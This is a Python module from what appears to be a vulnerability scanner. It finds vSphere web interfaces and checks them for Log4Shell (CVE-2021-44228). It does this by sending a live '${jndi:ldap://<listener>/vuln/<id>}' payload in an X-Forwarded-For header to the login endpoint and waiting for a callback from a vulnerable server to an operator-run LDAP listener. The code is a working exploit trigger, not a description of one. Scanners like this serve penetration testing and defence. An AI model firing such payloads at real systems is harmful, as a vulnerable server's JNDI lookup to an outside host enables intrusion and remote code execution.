import os.path

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from lib.httpscan.http import HTTP

from server.vulnerability_callback import VulnCallback

headers = [
    "X-Forwarded-For",
]

class Module:
    name = 'VSphere'
    description = 'Detects VSphere interfaces and check for known vulnerabilities (CVE-2021-44228) (uses server.py)'

    def run(self, target, args, useragent, proxy, timeout, safe):
        http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)

        Output.minor({'target': http.url(target['path']), 'message': '[%s] Running module...' % self.name})

        if len(args['args']) != 1:
            Output.error({'target': http.url(target['path']), 'message': '[%s] module requires 1 arg: ldap_listener_ip:port' % self.name})
            return

        result = http.get("/ui")

        if result != None and 'vsphere client' in result['title'].lower():
            Output.highlight({'target': http.url("/ui"), 'message': "[%s] VSphere interface located at: %s" % (self.name, http.url('/ui'))})

            result = http.get("/ui/login")

            if "?SAMLRequest=" in result['response_url']:
                # Check CVE-2021-44228

                exploit_url = result['response_url'].split('?SAMLRequest=')[0] + '?SAMLRequest='

                vuln_info = {
                    'hostname': target['hostname'],
                    'port': target['port'],
                    'service': 'http',
                    'url': http.url('/ui/login'),
                    'name': 'CVE-2021-44228 (VSphere - Log4Shell)',
                    'description': 'Server %s is vulnerable to CVE-2021-44228 (VSphere - Log4Shell)' % (http.url('/ui/login'),),
                }

                vuln_id = VulnCallback.new_vulnerability_check(vuln_info)

                payload = "${jndi:ldap://%s/vuln/%s}" % (args['args'][0], vuln_id)

                query_headers = {}
                for h in headers:
                    query_headers[h] = payload

                http2 = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout, read_timeout=1 )
                http2.get(exploit_url, headers=query_headers)

                Output.highlight({'target': http.url("/ui"), 'message': "[%s] VSphere exploit (CVE-2021-44228) sent, check your server.py interface" % self.name})

